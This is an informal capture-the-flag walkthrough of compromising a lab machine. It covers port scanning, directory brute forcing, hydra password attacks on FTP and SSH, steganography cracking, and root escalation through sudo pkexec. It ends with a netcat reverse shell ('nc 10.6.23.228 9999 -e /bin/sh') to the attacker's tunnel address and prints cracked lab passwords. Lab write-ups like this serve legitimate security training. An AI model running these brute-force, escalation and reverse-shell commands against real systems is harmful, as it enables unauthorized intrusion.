first run nmap nmap -sC -sV -vv -p- 10.10.28.113
try anonymous on ftp server
	didnt work, darn next step
lets look at the webpage 
	no metadata in there
lets try a gobuster (tried with and without arguments for both big and medium directory buster)
	gobuster dir -u 10.10.28.113 -w /usr/share/wordlists/dirb/big.txt -x http,php,txt,zip
	gobuster dir -u 10.10.28.113 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x http,php,txt,zip
	gobuster dir -u 10.10.28.113 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	gobuster dir -u 10.10.28.113 -w /usr/share/wordlists/dirb/big.txt
in the first one that we did we see that we have a hidden directory
	/island
	we can see the code word is...
		highlight the whole page, or inspect the page and you will find the code word
			vigilante
		lets try to use vigilante as the username for ftp and also for an ssh hydra attack
			hydra -l vigilante -P /usr/share/wordlists/rockyou.txt 10.10.28.113 ftp
			hydra -l vigilante -P /usr/share/wordlists/rockyou.txt 10.10.28.113 ssh
	lets also try a gobuster with /island
		gobuster dir -u 10.10.28.113/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
		we now find a sub directory with 2100
	http://10.10.28.113/island/2100/
	lets inspect element, you can avail your .ticket here but how?
		lets add a .ticket to the end of the web address (that didnt work)
so far gobuster has worked, lets try another one on the 2100 site and remember the .ticket
	gobuster dir -u 10.10.28.113/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket
		as we can see ticket was used at the end as an arugment, this is because of how it was written
			we get a /green_arrow.ticket
			now we have a hash to crack (base 58 hash)
				password is !#th3h00d
		now lets try to get in to the ftp server
			username: vigilante
			password: !#th3h00d
				we got in
		ls -la shows us a couple of pictures, we have aa.jpg, leave me alone and queens gambit
			get *.png
			get aa.jpg
		now copy all of those to the desktop to view them
		lets go back to the ftp site, we can do a cd .. and start to see what we can find
			we find two different folders, lets go into slade
				we cant...
			but we can get into vigilante
When we look at the desktop it looks like one of the png files is incorrect, the leave me alone one
	first lets see if we can do anything with the other files
		steghide extract -sf aa.jpg (this does not work becuase we need a password and !#th3h00d is not it)
	Lets look at the leave me alone file which is a .png next to the queens gambit file, also a .png
		using a hexeditor we can see that the leave me alone is not a png, while queens gambit is a png (look at
		the first header
	After this we can see the password is password
		we could have found the password another way though, using stegcracker which can be downloaded from 
		github
			stegcracker /home/kali/Desktop/aa.jpg /usr/share/wordlists/rockyou.txt

Counting lines in wordlist..
Attacking file '/home/kali/Desktop/aa.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: password
Tried 4 passwords
Your file has been written to: /home/kali/Desktop/aa.jpg.out
password

Now we can do a steghide and see that it extracted a password text file with a username
	steghide extract -sf  aa.jpg 
Enter passphrase: 
wrote extracted data to "ss.zip".
kali@kali:~$ unzip ss.zip 
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado            
lets do a cat passwd.txt
cat shado
	looks like we have a password, M3tahuman
we are in again, lets do an ls -la
	there is a user.txt file in here
we have a flag
	we try to move to root and the only thing we can do is a /usr/bin/pkexec
		WTF IS PKEXEC!!!
	allows for unauthorized users to run a program as another user
		i'll be damned, lets just run root as root then from slade
			sudo /usr/bin/pkexec ls /root/
			sudo /usr/bin/pkexec cat /root/root.txt
				we find another flag
WE ARE DONE, but you shouldnt feel like you are done, we have done too much so far to just be done with this
	lets make ourselves a root and never have to use pkexec again!!!
		first sudo ifconfig and get yoru tunnel ip address
		make a listening port
		make slades ass go  to your port on your tunnel!!! and do a damn reverse_tcp lookup
		sudo /usr/bin/pkexec /bin/nc 10.6.23.228 9999 -e /bin/sh
			now on your kali terminal you should be able to make changes and show that you are root
